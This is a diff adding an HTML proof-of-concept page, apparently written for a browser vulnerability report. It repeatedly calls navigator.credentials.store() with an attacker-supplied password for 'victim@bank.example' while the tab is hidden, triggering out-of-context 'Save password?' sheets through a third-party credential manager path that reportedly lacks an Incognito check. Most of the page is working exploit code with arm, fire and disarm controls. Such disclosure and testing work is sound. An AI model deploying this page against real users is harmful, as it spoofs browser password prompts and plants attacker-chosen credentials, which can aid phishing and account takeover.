@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>attacker.example - 3P CredMan store() variant</title>
+<style>
+  body { font-family: sans-serif; margin: 1.5em; }
+  #log { white-space: pre-wrap; font-family: monospace; font-size: 12px;
+         background: #111; color: #0f0; padding: 1em; height: 50vh;
+         overflow-y: scroll; }
+</style>
+</head>
+<body>
+<h2>store() variant &mdash; out-of-context "Save password?" sheet</h2>
+<p>
+  Same as <a href="poc.html">poc.html</a> but exercises
+  <code>navigator.credentials.store()</code> &rarr;
+  <code>ThirdPartyCredentialManagerImpl::Store()</code> &rarr;
+  <code>createCredentialAsync(ApplicationContext, ..., null, ...)</code>.
+  This path additionally lacks the Incognito gate.
+</p>
+<p>
+  <button onclick="armOnHide()">Arm: fire when tab becomes hidden</button>
+  <button onclick="fireNow()">Fire once now</button>
+  <button onclick="disarm()">Disarm</button>
+</p>
+<div id="log"></div>
+<script>
+'use strict';
+
+let timer = null;
+let n = 0;
+
+function log(s) {
+  const el = document.getElementById('log');
+  el.textContent += `[${new Date().toISOString()}] ${s}\n`;
+  el.scrollTop = el.scrollHeight;
+  console.log(s);
+}
+
+async function fire() {
+  n++;
+  const id = n;
+  log(`#${id} navigator.credentials.store(PasswordCredential) ` +
+      `visibilityState=${document.visibilityState}`);
+  try {
+    const cred = new PasswordCredential({
+      id: 'victim@bank.example',
+      password: 'attacker-supplied-' + id,
+    });
+    await navigator.credentials.store(cred);
+    log(`#${id} -> store() resolved`);
+  } catch (e) {
+    log(`#${id} -> ${e.name}: ${e.message}`);
+  }
+}
+
+function fireNow() { fire(); }
+
+function armOnHide() {
+  disarm();
+  log('Armed. Switch to another Chrome tab now.');
+  document.addEventListener('visibilitychange', onVis);
+  if (document.hidden) startLoop();
+}
+
+function onVis() {
+  log(`visibilitychange -> ${document.visibilityState}`);
+  if (document.hidden) startLoop(); else stopLoop();
+}
+
+function startLoop() {
+  if (timer !== null) return;
+  log('Tab hidden: starting store() loop (every 2000ms).');
+  fire();
+  timer = setInterval(fire, 2000);
+}
+
+function stopLoop() {
+  if (timer === null) return;
+  clearInterval(timer);
+  timer = null;
+}
+
+function disarm() {
+  document.removeEventListener('visibilitychange', onVis);
+  stopLoop();
+  log('Disarmed.');
+}
+
+log(`Loaded. isSecureContext=${window.isSecureContext}`);
+</script>
+</body>
+</html>
